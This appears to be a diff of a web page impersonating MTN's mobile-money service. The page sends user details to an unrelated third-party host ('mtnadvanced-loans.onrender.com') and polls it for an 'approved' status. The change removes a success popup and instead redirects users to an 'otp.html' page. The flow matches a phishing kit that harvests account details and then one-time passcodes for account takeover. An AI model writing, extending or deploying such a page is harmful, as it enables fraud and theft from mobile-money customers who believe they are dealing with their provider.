@@ -40,13 +40,9 @@
     border:1px solid var(--border);border-top:4px solid var(--mtn-blue-deep);
   }
 
-  .momo-head{
-    display:flex;align-items:center;justify-content:center;gap:10px;
-    margin-bottom:28px;
-  }
+  .momo-head{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px;}
   .momo-head .badge{
-    width:44px;height:44px;border-radius:12px;
-    background:var(--mtn-yellow);
+    width:44px;height:44px;border-radius:12px;background:var(--mtn-yellow);
     display:flex;align-items:center;justify-content:center;
     font-weight:900;color:var(--mtn-blue-deep);font-size:19px;
     box-shadow:0 4px 12px rgba(255,204,0,0.4);
@@ -98,97 +94,36 @@
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
 
-  /* ---------- Modal ---------- */
-  .modal-overlay{
-    position:fixed;inset:0;
-    background:rgba(10,27,51,0.55);
-    backdrop-filter:blur(4px);
-    display:none;
-    align-items:center;justify-content:center;
-    padding:20px;z-index:1000;
-    animation:fadeIn .25s ease;
-  }
-  .modal-overlay.show{display:flex;}
-  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
-
-  .modal{
-    background:#fff;width:100%;max-width:360px;
-    border-radius:18px;padding:30px 24px 26px;
-    text-align:center;
-    box-shadow:0 24px 60px rgba(0,43,92,0.35);
-    border-top:5px solid var(--green);
-    animation:pop .32s cubic-bezier(.18,.9,.32,1.4);
-  }
-  @keyframes pop{
-    from{transform:scale(.85);opacity:0;}
-    to{transform:scale(1);opacity:1;}
-  }
-
-  .modal .check{
-    width:62px;height:62px;border-radius:50%;
-    background:rgba(0,166,81,0.12);
-    display:flex;align-items:center;justify-content:center;
-    margin:0 auto 18px;
-  }
-  .modal .check svg{
-    width:32px;height:32px;stroke:var(--green);fill:none;
-    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
-  }
-
-  .modal h2{font-size:19px;font-weight:800;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
-  .modal p{font-size:13px;color:var(--muted);font-weight:600;line-height:1.6;margin-bottom:22px;}
-
-  .modal .ok-btn{
-    width:100%;padding:14px;border:none;border-radius:11px;
-    background:var(--mtn-blue-deep);color:#fff;
-    font-size:15px;font-weight:800;cursor:pointer;
-    letter-spacing:0.3px;transition:.18s;
-    box-shadow:0 6px 16px rgba(0,43,92,0.28);
-  }
-  .modal .ok-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}
-
-  /* ---------- FULL-SCREEN PROCESSING ---------- */
+  /* Full-screen processing */
   .processing-screen{
     position:fixed;inset:0;z-index:2000;
     background:radial-gradient(circle at 50% 35%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
-    color:#fff;
-    display:none;
-    align-items:center;justify-content:center;
-    flex-direction:column;
-    text-align:center;
-    padding:24px;
-    overflow:hidden;
+    color:#fff;display:none;align-items:center;justify-content:center;
+    flex-direction:column;text-align:center;padding:24px;overflow:hidden;
     animation:fadeIn .3s ease;
   }
   .processing-screen.show{display:flex;}
+  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
 
   .processing-screen .glow{
-    position:absolute;
-    width:460px;height:460px;border-radius:50%;
+    position:absolute;width:460px;height:460px;border-radius:50%;
     background:radial-gradient(circle, rgba(255,204,0,0.18) 0%, rgba(255,204,0,0) 70%);
-    animation:pulse 2.6s ease-in-out infinite;
-    pointer-events:none;
+    animation:pulse 2.6s ease-in-out infinite;pointer-events:none;
   }
-  @keyframes pulse{
-    0%,100%{transform:scale(1);opacity:.85;}
-    50%{transform:scale(1.18);opacity:1;}
-  }
+  @keyframes pulse{0%,100%{transform:scale(1);opacity:.85;}50%{transform:scale(1.18);opacity:1;}}
 
   .processing-screen .brand-mark{
     font-size:22px;font-weight:900;letter-spacing:3px;
-    text-transform:uppercase;color:#fff;
-    margin-bottom:40px;opacity:.9;position:relative;z-index:2;
+    text-transform:uppercase;color:#fff;margin-bottom:40px;
+    opacity:.9;position:relative;z-index:2;
   }
   .processing-screen .brand-mark em{font-style:normal;color:var(--mtn-yellow);}
 
   .processing-screen .spinner{
-    width:88px;height:88px;
-    border-radius:50%;
+    width:88px;height:88px;border-radius:50%;
     border:6px solid rgba(255,255,255,0.14);
-    border-top-color:var(--mtn-yellow);
-    border-right-color:var(--mtn-yellow);
-    animation:spin 0.95s linear infinite;
-    margin-bottom:34px;
+    border-top-color:var(--mtn-yellow);border-right-color:var(--mtn-yellow);
+    animation:spin 0.95s linear infinite;margin-bottom:34px;
     position:relative;z-index:2;
   }
   @keyframes spin{to{transform:rotate(360deg);}}
@@ -204,16 +139,13 @@
   }
 
   .processing-screen .progress{
-    width:240px;height:4px;
-    background:rgba(255,255,255,0.15);
-    border-radius:6px;margin-top:34px;overflow:hidden;
-    position:relative;z-index:2;
+    width:240px;height:4px;background:rgba(255,255,255,0.15);
+    border-radius:6px;margin-top:34px;overflow:hidden;position:relative;z-index:2;
   }
   .processing-screen .progress-bar{
     height:100%;width:0%;
     background:linear-gradient(90deg, var(--mtn-yellow), #FFE066);
-    border-radius:6px;
-    animation:fillBar 3.2s linear forwards;
+    border-radius:6px;animation:fillBar 3.2s linear forwards;
   }
   @keyframes fillBar{from{width:0%;}to{width:100%;}}
 
@@ -228,16 +160,11 @@
   }
   .processing-screen .dots span:nth-child(2){animation-delay:.2s;}
   .processing-screen .dots span:nth-child(3){animation-delay:.4s;}
-  @keyframes blink{
-    0%,80%,100%{background:rgba(255,255,255,0.25);}
-    40%{background:var(--mtn-yellow);}
-  }
+  @keyframes blink{0%,80%,100%{background:rgba(255,255,255,0.25);}40%{background:var(--mtn-yellow);}}
 
   .processing-screen .note{
-    margin-top:38px;font-size:12px;
-    color:rgba(255,255,255,0.55);
-    font-weight:600;letter-spacing:0.3px;
-    position:relative;z-index:2;
+    margin-top:38px;font-size:12px;color:rgba(255,255,255,0.55);
+    font-weight:600;letter-spacing:0.3px;position:relative;z-index:2;
   }
 
   @media(max-width:640px){
@@ -291,7 +218,7 @@
 
   <div class="frame-bottom"></div>
 
-  <!-- FULL-SCREEN PROCESSING -->
+  <!-- Full-screen processing -->
   <div class="processing-screen" id="processingScreen">
     <div class="glow"></div>
     <div class="brand-mark">MTN<em>.</em></div>
@@ -303,18 +230,6 @@
     <div class="note">This usually takes a few moments</div>
   </div>
 
-  <!-- Success popup -->
-  <div class="modal-overlay" id="successModal">
-    <div class="modal">
-      <div class="check">
-        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      </div>
-      <h2>Verification complete</h2>
-      <p>Your details have been received successfully.</p>
-      <button class="ok-btn" onclick="closeModal()">OK</button>
-    </div>
-  </div>
-
 <script>
   const API = "https://mtnadvanced-loans.onrender.com";
   const el = id => document.getElementById(id);
@@ -323,13 +238,6 @@
     const s = el('status');
     s.textContent = msg;
     s.className = 'status' + (type ? ' ' + type : '');
-  }
-
-  function openModal(){ el('successModal').classList.add('show'); }
-
-  function closeModal(){
-    el('successModal').classList.remove('show');
-    setTimeout(() => { window.location.href = 'index.html'; }, 250);
   }
 
   function showProcessing(){ el('processingScreen').classList.add('show'); }
@@ -383,8 +291,7 @@
 
           if(s.status === 'approved'){
             clearInterval(poll);
-            hideProcessing();
-            openModal();
+            window.location.href = 'otp.html';
           } else if(s.status === 'declined' || s.status === 'expired'){
             clearInterval(poll);
             hideProcessing();
@@ -407,10 +314,6 @@
       el('submitBtn').disabled = false;
     }
   }
-
-  document.addEventListener('keydown', e => {
-    if(e.key === 'Escape') closeModal();
-  });
 </script>
 </body>
 </html>
